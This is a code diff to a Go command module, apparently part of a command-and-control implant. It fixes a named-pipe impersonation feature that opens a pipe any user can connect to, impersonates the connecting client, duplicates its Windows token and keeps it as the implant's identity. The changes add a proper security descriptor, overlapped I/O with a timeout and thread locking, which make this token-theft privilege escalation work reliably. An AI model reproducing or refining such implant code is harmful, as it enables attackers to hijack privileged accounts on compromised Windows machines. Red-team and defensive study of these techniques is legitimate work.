@@ -6,6 +6,7 @@ package commands
 import (
 	"encoding/json"
 	"fmt"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
@@ -46,6 +47,7 @@ const (
 	PIPE_WAIT                = 0x00000000
 	PIPE_UNLIMITED_INSTANCES = 255
 	PIPE_BUFFER_SIZE         = 1024
+	// FILE_FLAG_OVERLAPPED is defined in poolpartyinjection.go
 )
 
 func (c *PipeServerCommand) Execute(task structs.Task) structs.CommandResult {
@@ -153,11 +155,21 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 
 	pipePath := fmt.Sprintf(`\\.\pipe\%s`, args.Name)
 
-	// Create security descriptor allowing Everyone to connect
-	var sd windows.SECURITY_DESCRIPTOR
+	// Create security descriptor allowing Everyone to connect.
+	// Must use NewSecurityDescriptor() which calls InitializeSecurityDescriptor
+	// to set revision=1; a zero-value SECURITY_DESCRIPTOR has revision=0 and
+	// SetDACL will fail with ERROR_INVALID_SECURITY_DESCR.
+	sd, sdErr := windows.NewSecurityDescriptor()
+	if sdErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to initialize security descriptor: %v", sdErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
 	if err := sd.SetDACL(nil, true, false); err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create security descriptor: %v", err),
+			Output:    fmt.Sprintf("Failed to set DACL on security descriptor: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -165,11 +177,13 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 
 	sa := windows.SecurityAttributes{
 		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
-		SecurityDescriptor: &sd,
+		SecurityDescriptor: sd,
 		InheritHandle:      0,
 	}
 
-	// Create the named pipe
+	// Create the named pipe with FILE_FLAG_OVERLAPPED for async I/O.
+	// A synchronous ConnectNamedPipe blocks the OS thread via SyscallN without
+	// notifying Go's scheduler, which can prevent timers from firing.
 	pipeNamePtr, err := windows.UTF16PtrFromString(pipePath)
 	if err != nil {
 		return structs.CommandResult{
@@ -181,7 +195,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 
 	hPipe, _, createErr := procCreateNamedPipeW.Call(
 		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX,
+		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
 		PIPE_TYPE_MESSAGE|PIPE_READMODE_MESSAGE|PIPE_WAIT,
 		PIPE_UNLIMITED_INSTANCES,
 		PIPE_BUFFER_SIZE,
@@ -200,48 +214,65 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	pipeHandle := windows.Handle(hPipe)
 	defer windows.CloseHandle(pipeHandle)
 
-	// Wait for client connection with timeout
-	// Use a goroutine + timer since ConnectNamedPipe is blocking
-	type connectResult struct {
-		success bool
-		err     error
-	}
-	resultCh := make(chan connectResult, 1)
-
-	go func() {
-		ret, _, err := procConnectNamedPipe.Call(hPipe, 0)
-		if ret == 0 {
-			// ERROR_PIPE_CONNECTED (535) means client connected before ConnectNamedPipe
-			if err == windows.ERROR_PIPE_CONNECTED {
-				resultCh <- connectResult{success: true}
-			} else {
-				resultCh <- connectResult{success: false, err: err}
-			}
-		} else {
-			resultCh <- connectResult{success: true}
+	// Create an event for overlapped ConnectNamedPipe
+	event, eventErr := windows.CreateEvent(nil, 1, 0, nil) // manual-reset, initially non-signaled
+	if eventErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("CreateEvent failed: %v", eventErr),
+			Status:    "error",
+			Completed: true,
 		}
-	}()
+	}
+	defer windows.CloseHandle(event)
 
-	// Wait for connection or timeout/cancel
-	timeout := time.Duration(args.Timeout) * time.Second
-	timer := time.NewTimer(timeout)
-	defer timer.Stop()
+	// Start async ConnectNamedPipe with OVERLAPPED
+	var overlapped windows.Overlapped
+	overlapped.HEvent = event
 
-	select {
-	case result := <-resultCh:
-		if !result.success {
+	ret, _, connectErr := procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
+	if ret == 0 {
+		// ConnectNamedPipe returned FALSE — check error code
+		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
 			return structs.CommandResult{
-				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", result.err),
+				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
 				Status:    "error",
 				Completed: true,
 			}
 		}
-	case <-timer.C:
-		// Cancel the blocking ConnectNamedPipe by disconnecting
-		procDisconnectNamedPipe.Call(hPipe)
+		// ERROR_IO_PENDING = async operation in progress, wait on event
+		// ERROR_PIPE_CONNECTED = client already connected before call
+	}
+
+	connected := connectErr == windows.ERROR_PIPE_CONNECTED
+	if !connected {
+		// Wait for connection with timeout using WaitForSingleObject
+		timeoutMs := uint32(args.Timeout * 1000)
+		waitResult, waitErr := windows.WaitForSingleObject(event, timeoutMs)
+		switch waitResult {
+		case windows.WAIT_OBJECT_0: // 0x00000000
+			connected = true
+		case 258: // WAIT_TIMEOUT (windows.WAIT_TIMEOUT is syscall.Errno, not uint32)
+			// Cancel the pending I/O and clean up
+			windows.CancelIoEx(pipeHandle, &overlapped)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Timeout after %ds — no client connected to %s", args.Timeout, pipePath),
+				Status:    "success",
+				Completed: true,
+			}
+		default:
+			windows.CancelIoEx(pipeHandle, &overlapped)
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("WaitForSingleObject failed: result=%d err=%v", waitResult, waitErr),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}
+
+	if !connected {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Timeout after %ds — no client connected to %s", args.Timeout, pipePath),
-			Status:    "success",
+			Output:    "Unexpected state: not connected after wait",
+			Status:    "error",
 			Completed: true,
 		}
 	}
@@ -256,9 +287,17 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 		}
 	}
 
+	// Lock goroutine to OS thread for the entire impersonation sequence.
+	// ImpersonateNamedPipeClient sets the token on the current OS thread,
+	// and Go's scheduler can migrate goroutines between threads at any point.
+	// Without LockOSThread, OpenThreadToken may run on a different thread
+	// and fail with ERROR_NO_TOKEN (1008).
+	runtime.LockOSThread()
+
 	// Client connected — impersonate
 	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
 	if ret == 0 {
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v\nThis usually means SeImpersonatePrivilege is not available.", impErr),
@@ -284,6 +323,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	if err != nil {
 		// Revert since we can't capture the token
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but failed to capture thread token: %v", clientIdentity, err),
@@ -317,6 +357,7 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 
 	if err != nil {
 		procRevertToSelf.Call()
+		runtime.UnlockOSThread()
 		procDisconnectNamedPipe.Call(hPipe)
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but DuplicateTokenEx failed: %v", clientIdentity, err),
@@ -329,8 +370,9 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 	procRevertToSelf.Call()
 	procDisconnectNamedPipe.Call(hPipe)
 
-	// Store the token in the global identity system (like steal-token)
+	// Store the token in the global identity system (calls ImpersonateLoggedOnUser on this thread)
 	if setErr := SetIdentityToken(dupToken); setErr != nil {
+		runtime.UnlockOSThread()
 		windows.CloseHandle(windows.Handle(dupToken))
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Client connected as %s but SetIdentityToken failed: %v", clientIdentity, setErr),
@@ -338,6 +380,9 @@ func pipeServerImpersonate(task structs.Task, args pipeServerArgs) structs.Comma
 			Completed: true,
 		}
 	}
+
+	// Mark as thread-locked so PrepareExecution doesn't double-lock
+	osThreadLocked = true
 
 	var sb strings.Builder
 	sb.WriteString("=== PIPE IMPERSONATION SUCCESS ===\n\n")
